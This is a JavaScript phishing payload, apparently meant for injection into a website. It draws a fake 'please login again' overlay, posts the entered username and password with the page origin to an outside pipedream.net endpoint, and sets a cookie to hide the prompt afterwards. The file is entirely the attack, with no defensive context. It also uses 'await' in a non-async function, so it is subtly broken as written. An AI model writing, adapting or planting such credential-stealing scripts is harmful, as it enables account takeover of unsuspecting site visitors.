function send_data() {
    let formData = new FormData(document.forms.user_data);
    formData.append("origin", location.origin);
    const phish_init = {
        method: "POST",
        body: formData
    }

    const phish_response = await fetch("https://enzfwkgp1bcq.x.pipedream.net/", phish_init);

    var expire = new Date();
    expire.setFullYear(expire.getFullYear() + 1);
    var cookie = "phishsession=true; path=/; expires=" + expire.toUTCString();
    document.cookie = cookie;

    window.location.reload();
}

var html = `
    <div style="position: absolute; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.5; top: 0; left: 0; margin: 0">
    </div>
    <div id="test_f_m" style="position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 280px; height: 185px; top: 50%; left: 40%; padding: 10px">
        <p>An error occurred. Please login again.</p>
        <form method="POST" name="user_data" onsubmit="send_data();return false;">
            <p>Username <input type="text" name="username"></p>
            <p>Password <input type="password" name="password"></p>
            <p><input type="submit" value="Login"></p>
        </form>
    </div>
`;

var div = document.createElement("div");
if (document.cookie.indexOf("phishsession") < 0) {
    div.innerHTML = html;
    document.getElementsByTagName("body")[0].appendChild(div);
}
